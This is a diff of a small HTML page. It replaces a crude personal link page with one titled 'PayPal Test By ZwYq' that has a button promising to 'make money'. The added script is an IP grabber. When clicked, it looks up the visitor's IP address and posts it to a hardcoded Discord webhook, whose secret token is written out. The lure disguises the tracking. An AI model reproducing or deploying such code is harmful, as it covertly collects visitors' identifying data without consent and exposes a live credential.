@@ -1,99 +1,64 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>I Can Feel Gigzas Coming Inside Of Me...</title>
-  <style>
-    @import url('https://fonts.googleapis.com/css2?family=Comic+Sans+MS&display=swap');
-    
-    body {
-      background-color: #09001A;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      position: relative;
-    }
-    
-    h1 {
-      font-size: 48px;
-      margin-top: 50px;
-      color: white;
-      font-family: 'Gill Sans', sans-serif;
-    }
-    
-    .letter {
-      display: inline-block;
-      animation: rainbow 5s infinite;
-    }
-    
-    @keyframes rainbow {
-      0% { color: red; }
-      14% { color: orange; }
-      28% { color: yellow; }
-      42% { color: green; }
-      57% { color: blue; }
-      71% { color: indigo; }
-      85% { color: violet; }
-      100% { color: red; }
-    }
-    
-    .button-container {
-      display: flex;
-      justify-content: center;
-      margin-top: 50px;
-    }
-    
-    .button {
-      background-color: #9D00CF;
-      color: white;
-      padding: 15px 30px;
-      border: none;
-      border-radius: 4px;
-      font-size: 20px;
-      cursor: pointer;
-      margin: 0 10px;
-    }
-    
-    .red-text {
-      color: red;
-      font-size: 18px;
-      margin-top: 10px;
-      font-family: 'Comic Sans MS', cursive;
-    }
-    
-    .text-label {
-      position: absolute;
-      bottom: 10px;
-      right: 10px;
-      color: #8D00C2;
-      font-size: 14px;
-      font-family: 'Comic Sans MS', cursive;
-    }
-  </style>
-  <script>
-    function openLinkInNewTab(link) {
-      window.open(link, "_blank");
-    }
-  </script>
-</head>
-<body>
-  <h1>
-    <span class="letter">🤑 ZwYq's</span>
-    <span class="letter"> </span>
-	<span class="letter">Most</span>
-	<span class="letter"> </span>
-	<span class="letter">Shit 🤑</span>
-  </h1>
-  <div class="button-container">
-    <button class="button" onclick="openLinkInNewTab('https://discord.gg/G2Yt6C6JjG')">My Discord Server.</button>
-    <button class="button" onclick="openLinkInNewTab('https://paypal.me/InsanityTrolling')">My PayPal.</button>
-    <button class="button" onclick="openLinkInNewTab('https://cdn.discordapp.com/attachments/1114191199801188453/1114338095400235058/image.png')">My Only Love.</button>
-  </div>
-  <p class="red-text">i will add more shit later im bored rn, dm suggestions.
-  </p>
-  <p class="text-label">Made By ZwYq#8058.</p>
-</body>
+  <head>
+    <style>
+      body {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        background-color: #000;
+      }
+
+      h1 {
+        font-size: 32px;
+        color: #8400B6;
+        text-align: center;
+      }
+
+      button {
+        margin-top: 10px;
+        padding: 10px 20px;
+        font-size: 16px;
+        background-color: #333;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+      }
+    </style>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+      function sendIP() {
+        // Fetches the user's IP address
+        $.getJSON("https://api.ipify.org?format=json", function(data) {
+          var ipAddress = data.ip;
+          var webhookURL = "https://discord.com/api/webhooks/1114345070775246938/Z3CNuKtr255UMW5svbpty9J5y0c80YijPcDMrhVW1s4rnlR2cGAEEQDCrmXVHLIVGoMy"; // Replace this with your actual Discord webhook URL
+
+          // Create a JSON payload with the IP address
+          var payload = JSON.stringify({ content: "IP: " + ipAddress });
+
+          // Send a POST request to the Discord webhook
+          $.ajax({
+            url: webhookURL,
+            type: "POST",
+            dataType: "json",
+            data: payload,
+            contentType: "application/json",
+            success: function() {
+              console.log("IP sent to Discord");
+            },
+            error: function(xhr, status, error) {
+              console.error("Error sending IP to Discord:", error);
+            }
+          });
+        });
+      }
+    </script>
+  </head>
+  <body>
+    <h1>PayPal Test By ZwYq</h1>
+    <button onclick="sendIP()">This Should Make Visual Money 🤑🤑🤑</button>
+  </body>
 </html>
